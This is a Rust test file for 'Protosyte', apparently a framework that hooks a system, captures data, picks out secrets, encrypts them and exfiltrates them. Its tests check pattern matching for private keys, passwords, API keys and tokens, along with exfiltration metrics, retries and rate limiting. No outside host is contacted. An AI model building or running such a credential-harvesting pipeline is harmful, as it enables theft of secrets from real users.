// End-to-end integration tests for Protosyte framework
// Tests complete workflows from data capture to exfiltration

use protosyte_seed::*;
use std::sync::Arc;
use tokio::sync::mpsc;
use std::time::Duration;

/// Test complete workflow: Hook -> Filter -> Encrypt -> Buffer -> Exfil
#[tokio::test]
async fn test_complete_data_capture_workflow() {
    // Setup components
    let crypto = Arc::new(CryptoManager::new());
    let hook_manager = Arc::new(HookManager::new());
    let (data_tx, mut data_rx) = mpsc::unbounded_channel();
    
    // Simulate captured data
    let test_data = b"password=secret123\napi_key=sk_live_1234567890";
    
    // Step 1: Filter data through hook manager
    if let Some(filtered) = hook_manager.filter_data(test_data) {
        // Step 2: Send to channel (simulating hook capture)
        let _ = data_tx.send(filtered);
    }
    
    // Step 3: Receive and encrypt
    if let Some(data) = data_rx.recv().await {
        let (encrypted, nonce) = crypto.encrypt_with_nonce(&data).await;
        assert!(!encrypted.is_empty());
        assert_eq!(nonce.len(), 12); // AES-GCM nonce size
        
        // Step 4: Decrypt and verify (combine nonce + ciphertext)
        let mut encrypted_with_nonce = nonce;
        encrypted_with_nonce.extend_from_slice(&encrypted);
        let decrypted = crypto.decrypt(&encrypted_with_nonce)
            .expect("Decryption should succeed");
        assert_eq!(decrypted, data);
    }
}

/// Test error handling in complete workflow
#[tokio::test]
async fn test_error_handling_in_workflow() {
    let crypto = Arc::new(CryptoManager::new());
    
    // Test invalid ciphertext
    let invalid_ciphertext = b"too short";
    assert!(crypto.decrypt(invalid_ciphertext).is_err());
    
    // Test valid encryption/decryption
    let data = b"valid sensitive data";
    let (encrypted, nonce) = crypto.encrypt_with_nonce(data).await;
    let mut encrypted_with_nonce = nonce;
    encrypted_with_nonce.extend_from_slice(&encrypted);
    let decrypted = crypto.decrypt(&encrypted_with_nonce)
        .expect("Valid decryption should succeed");
    assert_eq!(decrypted, data);
}

/// Test buffer operations with error handling
#[test]
fn test_buffer_error_handling() {
    use protosyte_seed::error_handling::ProtosyteError;
    
    let buffer = RingBuffer::new(protosyte_seed::constants::BUFFER_SIZE_SMALL);
    
    // Test successful write
    let small_data = b"test";
    assert!(buffer.write(small_data).is_ok());
    
    // Test buffer overflow
    let large_data = vec![0u8; protosyte_seed::constants::BUFFER_SIZE_SMALL + 100];
    let result = buffer.write(&large_data);
    assert!(result.is_err());
    
    // Verify error type
    if let Err(ProtosyteError::BufferError(_)) = result {
        // Correct error type
    } else {
        panic!("Expected BufferError");
    }
}

/// Test secure memory operations
#[test]
fn test_secure_memory_workflow() {
    use protosyte_seed::secure_memory::SecureMemory;
    
    // Allocate secure memory
    let mut mem = SecureMemory::new(1024)
        .expect("Memory allocation should succeed");
    
    // Write data
    let test_data = b"sensitive data";
    mem.write(0, test_data).expect("Write should succeed");
    
    // Read data
    let read_data = mem.read(0, test_data.len())
        .expect("Read should succeed");
    assert_eq!(read_data, test_data);
    
    // Test out of bounds
    assert!(mem.write(1000, test_data).is_err());
    assert!(mem.read(1000, test_data.len()).is_err());
}

/// Test metrics collection in workflow
#[tokio::test]
async fn test_metrics_in_workflow() {
    use protosyte_seed::logging::Metrics;
    
    let metrics = Arc::new(Metrics::new());
    
    // Simulate workflow metrics
    metrics.increment_payloads_sent();
    metrics.add_bytes_exfiltrated(1024);
    metrics.set_hooks_active(3);
    metrics.increment_payloads_failed();
    metrics.increment_errors();
    
    let stats = metrics.get_stats();
    assert_eq!(stats.payloads_sent, 1);
    assert_eq!(stats.payloads_failed, 1);
    assert_eq!(stats.bytes_exfiltrated, 1024);
    assert_eq!(stats.hooks_active, 3);
    assert_eq!(stats.errors_total, 1);
}

/// Test constants usage
#[test]
fn test_constants_usage() {
    use protosyte_seed::constants;
    
    // Verify polling intervals
    assert_eq!(constants::POLL_INTERVAL_FAST_MS, 50);
    assert_eq!(constants::POLL_INTERVAL_NORMAL_MS, 100);
    assert_eq!(constants::POLL_INTERVAL_SLOW_MS, 200);
    
    // Verify buffer sizes
    assert_eq!(constants::BUFFER_SIZE_DEFAULT, 1024);
    assert_eq!(constants::BUFFER_SIZE_MEDIUM, 2048);
    assert_eq!(constants::BUFFER_SIZE_LARGE, 4096);
    
    // Verify timeouts
    assert_eq!(constants::TIMEOUT_SHORT_MS, 1000);
    assert_eq!(constants::TIMEOUT_NORMAL_MS, 5000);
    assert_eq!(constants::TIMEOUT_LONG_MS, 30000);
}

/// Test error type conversions
#[test]
fn test_error_conversions() {
    use protosyte_seed::error_handling::ProtosyteError;
    
    // Test From<String>
    let err1: ProtosyteError = "test error".to_string().into();
    match err1 {
        ProtosyteError::SystemError(msg) => assert_eq!(msg, "test error"),
        _ => panic!("Expected SystemError"),
    }
    
    // Test From<&str>
    let err2: ProtosyteError = "another error".into();
    match err2 {
        ProtosyteError::SystemError(msg) => assert_eq!(msg, "another error"),
        _ => panic!("Expected SystemError"),
    }
}

/// Test retry mechanism with error handling
#[tokio::test]
async fn test_retry_mechanism() {
    use protosyte_seed::error_handling::{retry_with_backoff, RetryConfig, ProtosyteError};
    
    // Test successful retry
    let mut attempt = 0;
    let config2 = RetryConfig {
        max_attempts: 3,
        initial_delay: Duration::from_millis(10),
        max_delay: Duration::from_secs(1),
        backoff_multiplier: 2.0,
    };
    let result: Result<i32, ProtosyteError> = retry_with_backoff(config2, || {
        attempt += 1;
        Box::pin(async move {
            if attempt == 2 {
                Ok(42)
            } else {
                Err(ProtosyteError::NetworkError("temporary failure".to_string()))
            }
        })
    }).await;
    
    assert!(result.is_ok());
    assert_eq!(result.unwrap(), 42);
    assert_eq!(attempt, 2);
    
    // Test failure after max attempts
    let config3 = RetryConfig {
        max_attempts: 3,
        initial_delay: Duration::from_millis(10),
        max_delay: Duration::from_secs(1),
        backoff_multiplier: 2.0,
    };
    let result: Result<i32, ProtosyteError> = retry_with_backoff(config3, || {
        Box::pin(async move {
            Err(ProtosyteError::NetworkError("persistent failure".to_string()))
        })
    }).await;
    
    assert!(result.is_err());
}

/// Test hook filtering with various data patterns
#[test]
fn test_hook_filtering_patterns() {
    let manager = HookManager::new();
    
    let test_cases: Vec<(&[u8], bool)> = vec![
        (&b"-----BEGIN RSA PRIVATE KEY-----"[..], true),
        (&b"-----BEGIN PRIVATE KEY-----"[..], true),
        (&b"password=secret123"[..], true),
        (&b"api_key=sk_live_1234567890abcdef"[..], true),
        (&b"token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"[..], true),
        (&b"normal text without sensitive data"[..], false),
        (&b"regular log message"[..], false),
    ];
    
    for (data, should_match) in test_cases {
        let result = manager.filter_data(data);
        if should_match {
            assert!(result.is_some(), "Expected match for: {:?}", String::from_utf8_lossy(data));
        } else {
            assert!(result.is_none(), "Expected no match for: {:?}", String::from_utf8_lossy(data));
        }
    }
}

/// Test rate limiter integration
#[tokio::test]
async fn test_rate_limiter_integration() {
    use protosyte_seed::rate_limiter::RateLimiter;
    
    let rate_limiter = Arc::new(RateLimiter::new(
        protosyte_seed::constants::RATE_LIMIT_DEFAULT_KBPS * 1024,
        protosyte_seed::constants::RATE_LIMIT_DEFAULT_MSG_PER_MIN,
        true, // adaptive
    ));
    
    // Test rate limiting
    let wait_time = rate_limiter.acquire(1024).await;
    // Should not wait for first request
    assert!(wait_time.is_none() || wait_time.unwrap().as_millis() < 100);
    
    // Record success
    rate_limiter.record_success();
    
    // Record error
    rate_limiter.record_error();
}

